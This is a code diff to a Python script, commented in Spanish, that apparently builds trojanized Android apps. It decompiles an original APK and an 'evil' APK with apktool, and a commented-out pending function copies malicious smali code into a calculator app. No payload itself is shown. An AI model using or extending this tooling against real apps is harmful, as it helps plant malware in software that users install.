@@ -154,9 +154,22 @@ def decompileApk(apk_file):
 
     # Verificar si el archivo APK existe y es legible
     if os.path.exists(apk_file) and os.access(apk_file, os.R_OK):
-        print(f"\n\nDecompilando APK con apktool...\n")
+        # Verificar si el directorio ya existe
+        if os.path.exists(apk_file_without_extension):
+            print(f"\n\nBorrando antiguo decompilado y decompilando nuevamente...\n")
+            # Intentar eliminar el directorio previamente decompilado
+            try:
+                subprocess.run(["rm", "-rf", apk_file_without_extension], check=True)
+                print(f"Antiguo directorio decompilado eliminado correctamente.")
+            except subprocess.CalledProcessError as e:
+                print(f"Error al eliminar el directorio antiguo decompilado: {e}")
+                sys.exit(1)
+        
+        # Decompilar el APK
+        print(f"\nDecompilando APK con apktool...\n")
         resultDecompileApk = subprocess.run(["apktool", "d", apk_file, "-o", apk_file_without_extension])
 
+        # Verificar si la decompilación fue exitosa
         if resultDecompileApk.returncode == 0:
             print(f"\nAPK decompilado con éxito en {apk_file_without_extension}.")
         else:
@@ -197,6 +210,13 @@ def evilApkDecompile(compiledEvilApk, decompiledEvilApk):
         else:
             print(f"\nError al decompilar el APK maligno {compiledEvilApk}.")
             sys.exit(1)
+
+#pendiente
+#def copyEvilSmali(routeEvilSmali):
+#    if not os.path.exists(routeEvilSmali):
+#        print(f"\nCopiando ficheros Smali malignos a APK original.")
+#        os.chdir("/home/kali/Documents/APKmobile/trojan/")
+#        os.system("tar -cf - ./smali | (cd /home/kali/Documents/APKmobile/com.victormugo.calculator_2014-10-27/smali/; tar -xpf -)")
 
 def verificar_programa_windows(programa):
     result_verificar_programas_windowsx = subprocess.run(["where", programa])
